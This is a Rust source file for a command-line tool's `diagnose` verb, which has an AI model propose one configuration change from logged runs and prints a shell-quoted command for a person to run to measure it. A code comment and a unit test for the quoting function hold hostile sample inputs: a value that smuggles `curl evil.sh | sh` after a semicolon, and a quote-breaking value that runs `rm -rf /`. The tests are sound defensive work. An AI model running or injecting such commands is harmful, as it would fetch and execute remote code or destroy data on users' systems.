//! `mecha diagnose` — read the run corpus and propose one change to try.
//!
//! The stage between `doctor` (something is wrong) and a measurement
//! (did the fix help). It is the only place in this loop a model authors
//! anything, and everything about how it is run is arranged around the fact
//! that it will usually be wrong: the proposal is typed, it carries a
//! prediction, and it is printed with the exact command that would falsify it
//! rather than applied.
//!
//! **This verb does not measure, and does not apply.** Running the arms costs
//! a real model run per case per arm, so making that automatic would put an
//! hour of inference behind a command whose output is a suggestion. The
//! measurement is one line away and the human decides to spend it. The
//! nightly counterpart is `mecha harness ruminate`, which runs the same pass
//! through the same functions below and *does* measure — by counterfactual
//! replay, against the candidate gate, with the judgement recorded.

use crate::{setup, GlobalOpts};
use anyhow::{Context, Result};
use mecha_core::agent::Conversation;
use mecha_core::diagnose::{
    carries_over, diagnose_system, parse_proposal, Evidence, Proposal, DIAGNOSE_INSTRUCTION,
};
use mecha_core::message::Block;
use mecha_core::runlog::{Corpus, Scan};
use mecha_core::session::Session;

#[derive(clap::Args, Debug)]
pub struct Args {
    /// Which model's runs to diagnose. Defaults to whichever has the most.
    #[arg(long)]
    pub model: Option<String>,

    /// Only sessions started in the last N days.
    #[arg(long)]
    pub days: Option<i64>,

    /// Stop after this many sessions, newest first.
    #[arg(long, short = 'n', default_value_t = 200)]
    pub limit: usize,

    /// Print the brief the diagnostician would be handed, and stop.
    ///
    /// The cheap way to see what it is reasoning from — and the honest way to
    /// find out that the corpus does not yet say anything, before paying for
    /// a run that would invent something to say.
    #[arg(long)]
    pub dry_run: bool,
}

/// Scan the run corpus and pick one model's slice — one model, because a rate
/// blended across two describes neither. `Ok(None)` means the corpus holds no
/// recorded outcomes at all, which callers report in their own register: an
/// error at a terminal, a quiet skip at 03:30.
pub fn corpus_slice(
    want: Option<&str>,
    days: Option<i64>,
    limit: usize,
) -> Result<Option<(String, Corpus, usize)>> {
    let dir = Session::default_dir()?;
    let since = days.map(|d| chrono::Utc::now() - chrono::Duration::days(d));
    let corpus = Corpus::scan(
        &dir,
        &Scan {
            max_sessions: Some(limit),
            since,
        },
    )?;
    let sessions_read = corpus.sessions_read;
    if corpus.is_empty() {
        return Ok(None);
    }
    let by_model = corpus.by_model();
    let picked = match want {
        Some(want) => {
            let slice = by_model
                .get(want)
                .with_context(|| format!("no recorded runs for model `{want}`"))?;
            (want.to_string(), slice.clone())
        }
        None => {
            let (model, slice) = by_model
                .iter()
                .max_by_key(|(_, c)| c.len())
                .expect("corpus is not empty");
            (model.clone(), slice.clone())
        }
    };
    Ok(Some((picked.0, picked.1, sessions_read)))
}

/// Build the evidence brief for one model's slice: counters, plus doctor's
/// own findings about runs and triggers — machine-authored text, the only
/// prose in the brief — plus whatever history the caller wants the
/// diagnostician to not re-derive.
pub fn evidence_for(model: &str, slice: &Corpus, history: Vec<String>) -> Evidence {
    let mut evidence = Evidence::of(model, slice);
    if let Ok(home) = mecha_core::work::mecha_home() {
        for finding in mecha_core::doctor::examine(&home, chrono::Utc::now())
            .into_iter()
            .filter(|f| f.component == "runs" || f.component == "triggers")
        {
            evidence
                .findings
                .push(format!("{} — {}", finding.summary, finding.detail));
        }
    }
    evidence.history = history;
    evidence
}

/// The checkout the diagnostician may read, if one is configured and present.
///
/// Global config only, by construction — `[harness]` is stripped from project
/// layers — and re-read here rather than taken from the caller's `Prepared`,
/// because this decides the workspace that `prepare` is then called with.
///
/// A configured directory that is missing is reported and then treated as
/// absent, not as a hard failure: a nightly that stops entirely because a
/// checkout moved is worse than one that diagnoses from counters and says it
/// did. What must never happen is the third thing — proceeding while the
/// prompt still claims the source is readable.
fn source_dir() -> Result<Option<std::path::PathBuf>> {
    let Some(dir) = mecha_core::config::Config::load_global()?
        .harness
        .source_dir
    else {
        return Ok(None);
    };
    match dir.canonicalize() {
        Ok(dir) if dir.is_dir() => Ok(Some(dir)),
        _ => {
            eprintln!(
                "mecha: [harness] source_dir names {}, which is not a readable \
                 directory — diagnosing from counters alone",
                dir.display()
            );
            Ok(None)
        }
    }
}

/// What one diagnostic pass produced.
pub struct Diagnosis {
    /// The model's full reply, reasoning included.
    pub reply: String,
    pub outcome: DiagnosisOutcome,
}

pub enum DiagnosisOutcome {
    /// It declined to propose, or wrote a block that could not be measured.
    /// Both are better than a change nobody can falsify.
    NoProposal,
    /// Refused: the proposal reproduced a run of words from what it read.
    /// The quoted run rides along for the human-facing explanation.
    Quoted {
        run: String,
    },
    Proposal(Proposal),
}

/// Run the diagnostician once over an evidence brief and vet what came back.
///
/// One code path for `mecha diagnose` and the nightly, because two spellings
/// of "read-only, no outbox, no learned rules" is how one of them silently
/// stops being true.
pub async fn run_diagnostician(global: &GlobalOpts, evidence: &Evidence) -> Result<Diagnosis> {
    // The diagnostician's most useful input is this repository's own
    // documentation, which records why each mechanism exists and is what stops
    // a proposal unpicking something load-bearing. Reaching it takes an
    // explicit grant, because "wherever the caller is standing" was not one:
    // the nightly stands in `~/.mecha/work/ruminate/`, on purpose and for a
    // good reason, and that directory is empty.
    //
    // **The jail root and the config root are separated here rather than
    // reconciled.** `scripts/ruminate.sh` refuses to stand in a checkout so
    // that a project's `mecha.toml` never gets in front of an unattended run,
    // and that refusal is right. But `prepare_tools` discovers config from the
    // *cwd* and roots the jail at the *workspace*, so the two were never the
    // same question. Standing outside, pointing the workspace in, and pinning
    // `global_config_only` gets the documentation without the project layer —
    // and pins it belt-and-braces, so this holds even if someone later runs
    // the nightly from a checkout by hand.
    let source = source_dir()?;
    let opts = GlobalOpts {
        read_only: true,
        yes: false,
        system: Some(diagnose_system(source.as_deref())),
        no_outbox: true,
        no_learned_rules: true,
        global_config_only: true,
        workspace: source.clone().or_else(|| global.workspace.clone()),
        ..global.clone()
    };
    let prepared = setup::prepare(&opts, false).await?;
    match &source {
        Some(dir) => eprintln!("reading source and docs from {}", dir.display()),
        None => eprintln!(
            "no `[harness] source_dir` configured — diagnosing from counters alone, \
             and the prompt says so rather than claiming otherwise"
        ),
    }

    eprintln!(
        "diagnosing {} run(s) of `{}` · {} ({})",
        evidence.runs, evidence.model, prepared.model, prepared.provider_name
    );

    let brief = evidence.brief();
    let mut convo = Conversation::user(format!("{brief}\n---\n{DIAGNOSE_INSTRUCTION}"));
    let outcome = prepared.agent.run(&mut convo, None).await?;

    let Some(proposal) = parse_proposal(&outcome.text) else {
        return Ok(Diagnosis {
            reply: outcome.text,
            outcome: DiagnosisOutcome::NoProposal,
        });
    };

    // What it read, so a lifted sentence can be caught. Every tool result in
    // the conversation: the source it opened, the pages it fetched, the
    // searches it ran.
    let sources: Vec<String> = convo
        .messages
        .iter()
        .flat_map(|m| &m.content)
        .filter_map(|b| match b {
            Block::ToolResult { content, .. } => Some(content.clone()),
            _ => None,
        })
        .collect();
    let refs: Vec<&str> = sources.iter().map(String::as_str).collect();
    let quoted =
        carries_over(&proposal.rationale, &refs).or_else(|| carries_over(&proposal.change, &refs));

    Ok(Diagnosis {
        reply: outcome.text,
        outcome: match quoted {
            Some(run) => DiagnosisOutcome::Quoted { run },
            None => DiagnosisOutcome::Proposal(proposal),
        },
    })
}

pub async fn execute(global: &GlobalOpts, args: Args) -> Result<()> {
    let Some((model, slice, _)) = corpus_slice(args.model.as_deref(), args.days, args.limit)?
    else {
        let dir = Session::default_dir()?;
        anyhow::bail!(
            "no recorded run outcomes in {} — outcomes are recorded from the release that \
             added the record, so the corpus fills as you use it",
            dir.display(),
        );
    };

    // The interactive verb shows history too: a person about to spend a
    // measurement deserves to know what already failed one.
    let history = harness_history().unwrap_or_default();
    let evidence = evidence_for(&model, &slice, history);

    if args.dry_run {
        println!("{}", evidence.brief());
        return Ok(());
    }

    let diagnosis = run_diagnostician(global, &evidence).await?;
    println!("{}\n", diagnosis.reply.trim());

    match diagnosis.outcome {
        DiagnosisOutcome::NoProposal => {
            println!(
                "no proposal — the diagnostician either found nothing worth changing or wrote a \
                 block that could not be measured. Both are better than a change nobody can \
                 falsify."
            );
        }
        DiagnosisOutcome::Quoted { run } => {
            println!("── proposal ──");
            println!(
                "REFUSED: the proposal reproduces what it read — \"{run}\". A conclusion drawn \
                 from a source is a proposal; a sentence lifted from one is the source's, and a \
                 sentence in the prompt prefix is the longest-lived thing in this system."
            );
        }
        DiagnosisOutcome::Proposal(proposal) => {
            println!("── proposal ──");
            println!("class:     {:?}", proposal.class);
            println!("change:    {}", proposal.change);
            println!("predicts:  lower {:?}", proposal.metric);
            println!("because:   {}", proposal.rationale);

            println!("\nnothing to do here yet — measure it:");
            // Shell-quoted, because `change` is model-authored and the
            // diagnostician runs with `web_search` and `http_fetch`: a
            // proposal that clears the reproduction check can still carry
            // shell metacharacters, and this line is printed to be pasted.
            // `max_turns=40; curl … | sh #` reads as a plausible command
            // otherwise.
            println!(
                "  mecha eval --ab-config {} eval/cases.jsonl",
                shell_quote(&proposal.change)
            );
            println!(
                "\nthat runs the case set twice and judges the difference against a holdout — \
                 or `mecha harness ruminate` measures it against replayed sessions overnight. \
                 Until one of them does, this is a guess: automated failure attribution is \
                 right about which step failed roughly one time in seven, which is exactly why \
                 nothing here is applied."
            );
        }
    }
    Ok(())
}

/// One line per already-disposed candidate, for the brief. Best-effort: a
/// missing store is an empty history, not an error. Newest 20 only — the
/// brief rides in a real request every night, and the dedupe in `harness
/// ruminate` catches an exact re-derivation regardless of age.
pub fn harness_history() -> Result<Vec<String>> {
    let store = mecha_core::harness::HarnessStore::open_default()?;
    let all = store.all()?;
    let newest_20 = all.len().saturating_sub(20);
    Ok(all[newest_20..]
        .iter()
        .map(|c| {
            let verdict = match c.status.as_str() {
                mecha_core::harness::STATUS_REJECTED => {
                    format!(
                        "rejected: {}",
                        c.reason.as_deref().unwrap_or("measured worse")
                    )
                }
                mecha_core::harness::STATUS_REVERTED => "accepted, then reverted by hand".into(),
                mecha_core::harness::STATUS_ACCEPTED => "accepted and live".into(),
                _ => "staged, awaiting a person".into(),
            };
            format!("{} ({:?}) — {verdict}", c.change, c.class)
        })
        .collect())
}

/// Single-quote a value for a shell, so a printed command cannot become a
/// different command. POSIX-portable: end the quoted run, emit an escaped
/// quote, start a new one.
pub fn shell_quote(value: &str) -> String {
    if !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "=_-./:".contains(c))
    {
        return value.to_string();
    }
    format!("'{}'", value.replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::shell_quote;

    #[test]
    fn an_ordinary_override_is_printed_bare_and_anything_else_is_quoted() {
        assert_eq!(shell_quote("max_turns=40"), "max_turns=40");
        assert_eq!(
            shell_quote("compact_at_tokens=8000"),
            "compact_at_tokens=8000"
        );

        // The shape that matters: model-authored text, printed to be pasted.
        let hostile = "max_turns=40; curl evil.sh | sh #";
        let quoted = shell_quote(hostile);
        // Wrapped whole, so every metacharacter is inside the quoting and
        // the shell sees one argument rather than three commands.
        assert_eq!(quoted, format!("'{hostile}'"));

        // And a value containing a quote cannot end the quoting early.
        let sneaky = "a'; rm -rf /; echo '";
        let quoted = shell_quote(sneaky);
        assert_eq!(quoted.matches("'\\''").count(), 2, "{quoted}");
    }
}
